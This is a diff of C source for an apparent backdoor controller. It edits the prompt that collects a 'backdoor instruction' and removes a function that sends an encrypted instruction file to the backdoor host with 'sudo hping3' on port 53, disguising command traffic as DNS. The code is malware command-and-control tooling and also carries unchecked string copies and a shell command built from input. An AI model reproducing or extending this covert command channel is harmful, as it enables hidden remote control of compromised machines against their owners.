@@ -117,9 +117,9 @@ void get_instruction(struct options_sniffer *opts) {
     uint8_t input_length = 0;
 
     while(1) {
-        puts("\n[ SNIFFING Instruction ]");
-        puts("Type [ Instruction ] to forward the backdoor instruction");
-        puts("Ex) tcp and dst port 443 -c 30 (if '-c' not provided it will get 100 packets by default)");
+        printf("\n[ SNIFFING Instruction ]\n");
+        printf("Type [ Instruction ] to forward the backdoor instruction\n");
+        printf("Ex) tcp and dst port 443 -c 30 (if '-c' not provided it will get 100 packets by default)\n");
         fflush(stdout);
 
         fgets(input, sizeof(input), stdin);
@@ -127,6 +127,7 @@ void get_instruction(struct options_sniffer *opts) {
         input[input_length - 1] = '\0';
         if (input_length > 0) {
             strcpy(opts->sniff_instruction, input);
+            memset(input, 0, sizeof(input));
             break;
         }
     }
@@ -181,25 +182,6 @@ void encrypt_and_create_instruction_file(struct options_sniffer *opts) {
     fprintf(output, "%s", opts->encrypt_command);
     fclose(output);
     sleep(1);
-}
-
-
-void send_instruction(struct options_sniffer *opts) {
-    char hping3[64] = {0};
-    int pid;
-
-    pid = fork();
-    if (pid == -1) {
-        puts("fork() failed");
-        exit(1);
-    }
-    else if (pid == 0) {
-        sprintf(hping3, "sudo hping3 -c 1 -2 -E ./instruction.txt -d 100 -p 53 %s", opts->sniff_ip);
-        system(hping3);
-    }
-    else {
-        wait(NULL);
-    }
 }
 
 
